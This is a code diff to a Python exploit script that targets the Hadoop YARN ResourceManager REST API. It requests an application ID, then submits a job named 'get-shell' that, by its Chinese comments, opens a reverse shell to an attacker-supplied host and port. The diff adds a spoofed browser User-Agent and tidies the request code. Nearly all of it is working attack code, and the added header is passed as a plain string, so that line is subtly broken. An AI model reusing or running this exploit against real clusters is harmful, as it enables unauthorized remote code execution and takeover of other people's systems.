@@ -9,7 +9,9 @@ version  : Python 3.10
 """
 import requests
 import argparse
+import json
 
+header = 'User-Agent: Mozilla/5.0 (Windows; U; Windows NT 5.1; zh-CN; rv:1.8.1.11) Gecko/20071127 Firefox/2.0.0.11'
 payload1 = 'ws/v1/cluster/apps/new-application'
 payload2 = 'ws/v1/cluster/apps'
 print(
@@ -37,10 +39,10 @@ def getshell(target,lhost,lport):
     :param lport: 反弹shell 端口
     :return: null
     """
-    url = str(target) + str(payload1)
-    resp = requests.post(url)
+    url1 = str(target) + str(payload1)
+    resp = requests.post(url=url1)
     app_id = resp.json()['application-id']
-    url = target + str(target) + str(payload2)
+    url2 = str(target) + str(payload2)
     data = {
         'application-id': app_id,
         'application-name': 'get-shell',
@@ -51,11 +53,7 @@ def getshell(target,lhost,lport):
         },
         'application-type': 'YARN',
     }
-    response = requests.post(url, json=data)
-    if response.status_code == 200:
-        print("Payload发送成功，请检查shell是否反弹")
-    else:
-        print("Payload请求失败，程序已结束")
+    requests.post(url=url2, headers=header, data=json.dumps(data))
 
 
 if __name__ == '__main__':
